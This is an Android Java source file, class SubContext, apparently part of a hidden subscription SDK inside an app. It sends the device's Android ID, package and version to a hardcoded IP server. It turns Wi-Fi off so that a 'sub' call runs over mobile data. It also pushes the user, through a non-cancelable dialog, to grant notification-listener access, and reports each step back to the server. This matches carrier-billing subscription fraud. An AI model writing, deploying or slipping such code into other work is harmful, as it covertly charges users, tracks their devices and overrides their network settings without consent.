package com.enhtmv.sublib.common;

import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.text.TextUtils;

import com.enhtmv.sublib.common.util.StringUtil;
import com.enhtmv.sublib.common.util.SubLog;
import com.enhtmv.sublib.common.util.NetUtil;

import static android.net.wifi.WifiManager.WIFI_STATE_DISABLED;
import static com.enhtmv.sublib.common.SubEvent.*;


public class SubContext {

    private static SubCall subCall;
    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
    private static final String ACTION_NOTIFICATION_LISTENER_SETTINGS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS";


    private Context context;

    private boolean closeWifi = true;

    private NetworkStateReceiver receiver;


    private String androidId, packageName, version;

    public SubContext(Context context, SubCall subCall) {

        this.context = context;
        this.androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        this.packageName = context.getPackageName();


        try {
            version = context.getApplicationContext()
                    .getPackageManager()
                    .getPackageInfo(context.getPackageName(), 0).versionName;
        } catch (Exception e) {
            SubLog.e(e);
        }

        SubReport.init("http://54.153.76.222:8081", androidId, packageName, version);


        setSubCall(subCall);

        SharedPreferences shared = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);


        if (!shared.getBoolean(INSTALLED, false)) {
            SubContext.subCall.report(INSTALLED, "version: " + version);
            shared.edit().putBoolean(INSTALLED, true).apply();
        }

    }

    public void setCloseWifi(boolean closeWifi) {
        this.closeWifi = closeWifi;
    }

    public void destroy() {
        if (receiver != null) {
            context.unregisterReceiver(receiver);
            receiver = null;
        }
    }

    private void subSuccess() {
        SharedPreferences shared = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);

        SharedPreferences.Editor editor = shared.edit();

        editor.putBoolean("sub_state", true);

        editor.apply();
    }

    private boolean subState() {
        SharedPreferences shared = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);


        return shared.getBoolean("sub_state", false);

    }

    public void state(final SubCallBack<String> callBack) {


        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String info = SubReport.getReport().info();

                    callBack.callback(info);

                } catch (Exception e) {
                    SubLog.e(e);
                }
            }
        }).start();

    }

    public void setSubCall(SubCall subCall) {

        if (subCall != null) {


            SubCallBack<String> subCallBack = new SubCallBack<String>() {
                @Override
                public void callback(String string) {
                    subSuccess();
                }
            };

            subCall.init(packageName, androidId, subCallBack);

            SubContext.subCall = subCall;
        }
    }


    public void startActivity(Intent intent) {
        context.startActivity(intent);
    }


    public void call() {

        //是否订阅成功
        if (!subState()) {

            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {

                        String info = SubReport.getReport().info();

                        if (!StringUtil.isEmpty(info)) {

                            //关闭wifi
                            if (wifiStateAndClose()) {
                                subCall.sub(info);
                            }
                        }

                    } catch (Exception e) {
                        SubLog.e(e);
                    }

                }

            }).start();
        }


    }

    public static void call(final String message) {

        if (subCall != null) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    subCall.onSub(message);
                }
            }).start();
        }
    }


    public boolean wifiStateAndClose() {

        if (closeWifi) {

            int netCode = NetUtil.getNetworkState(context);

            if (netCode == NetUtil.NETWORK_WIFI) {

                SubLog.d("start close wifi");


                //注册广播
                if (receiver == null) {

                    receiver = new NetworkStateReceiver(new SubCallBack<String>() {
                        @Override
                        public void callback(String string) {
                            call();
                        }
                    });

                    IntentFilter filter = new IntentFilter();

                    filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
                    filter.addAction("android.net.wifi.WIFI_STATE_CHANGED");
                    filter.addAction("android.net.wifi.STATE_CHANGE");

                    context.registerReceiver(receiver, filter);
                }

                WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);

                wifiManager.setWifiEnabled(false);

                return false;
            } else if (netCode == NetUtil.NETWORK_NONE) {
                SubLog.w("not network");
                return false;
            }

            subCall.report(OPEN_4G_NETWORK);
        }

        return true;
    }


    public boolean isNotificationServiceEnabled() {

        String pkgName = context.getPackageName();
        final String flat = Settings.Secure.getString(context.getContentResolver(),
                ENABLED_NOTIFICATION_LISTENERS);

        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {

                        subCall.report(OPEN_NOTIFICATION);


                        return true;
                    }
                }
            }
        }
        return false;
    }


    public void showNotificationDialog(String title, String content, String yes, String no) {

        this.buildNotificationAlert(title, content, yes, no).show();

    }


    public AlertDialog buildNotificationAlert(String title, String content, String yes, String no) {
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(context);
        alertDialogBuilder.setCancelable(false);
        alertDialogBuilder.setTitle(title);
        alertDialogBuilder.setMessage(content);
        alertDialogBuilder.setPositiveButton(yes,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        startActivity(new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        SubLog.i("notification permission activity");
                        SubReport.getReport().i(OPEN_NOTIFICATION);
                    }
                });
        alertDialogBuilder.setNegativeButton(no,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {

                        SubLog.w("cancel notification permission");

                        SubReport.getReport().w("cancel notification permission");

//                        subCall.r().w("cancel of notification authorization");

                    }
                });
        return (alertDialogBuilder.create());
    }


    public class NetworkStateReceiver extends BroadcastReceiver {

        private SubCallBack<String> callBack;

        public NetworkStateReceiver(SubCallBack<String> callBack) {
            this.callBack = callBack;
        }

        @Override
        public void onReceive(Context context, Intent intent) {

            SubLog.i("NetworkStateReceiver", intent.toString());

            int wifiState = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, 0);


            if (wifiState == WIFI_STATE_DISABLED) {

                int networkState = NetUtil.getNetworkState(context);


                if (networkState == NetUtil.NETWORK_WIFI || networkState == NetUtil.NETWORK_NONE) {

                    SubLog.w("current wifi state or not network");
                } else {

                    new Thread(new Runnable() {
                        @Override
                        public void run() {

                            try {

                                Thread.sleep(2000);

                                SubLog.i("onReceive subCall");

                                subCall.report(OPEN_4G_NETWORK);

                                callBack.callback(null);
                            } catch (Exception e) {
                                SubLog.e(e);
                                subCall.report.e("4g call error", e);
                            }

                        }
                    }).start();
                }
            }
        }
    }


}
